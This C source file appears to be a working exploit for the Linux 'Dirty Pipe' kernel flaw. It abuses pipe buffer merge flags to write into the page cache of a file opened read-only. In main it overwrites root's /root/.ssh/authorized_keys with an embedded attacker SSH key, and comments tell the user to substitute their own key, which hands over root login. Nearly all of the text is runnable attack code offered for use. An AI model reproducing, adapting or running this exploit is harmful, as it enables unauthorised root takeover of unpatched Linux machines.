#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}

int main(int argc, char **argv)
{
    /* open roots authorized_keys file*/
    const char* path = "/root/.ssh/authorized_keys";
    const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return EXIT_FAILURE;
    }

    /*Change this key to your key created with ssh-keygen*/
    /*Due to how the offsets work make sure to remove the first s of ssh-rsa*/
    const char* new_key = "sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXXiSefiZJikyRlDX4f37G++VPni7URUVMgG5sRMq1BUOHAATBm+7n+JPe3/+cViimEOqRH3cI73OvGQz+NwJfVSrlRjxSzkOted36omqUkqDWOmbzaKSirKruj6oQltQ5keN3/opkvHbBturI/L0hB8rgaDPq35LfiaE1LRu/H5KGYib4B0oVnVbJ33u8/Y54Cwld7zIKTKdanvPwu2lmV0swYXuQHv3ydJAWMh/9HdFslj9BM43NsVakTqHBJ0qdC11tww0gieKMJlPgJYKCjW+2uahPYXsDNjW0+wl2wxxSqZnkBFFwsX5gahKwmxGVQLRX7rtYJ1Mnzu+ZdxlhQBy+lUsiWtfbdlj+i0tsO3zO2b9k2a6sXTpGzEYaQ9+nUnbpB3Ih5i2Oc3uimS0n2BbrynUKLzha5FmqW7uc+ZQGmkBy06pSHN2q39MhzmoluYFbVcb4lWgr1tUjoWh18WWHG+YM0ybj88DNhkFP3LYfj1WI/9YKrU0SxAAjxvU=\n";
    const size_t new_key_size = strlen(new_key);

    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    long int offset = 0;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], new_key, new_key_size);
    if (nbytes < 0) {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < new_key_size) {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    printf("It worked!\n");
    return EXIT_SUCCESS;
}
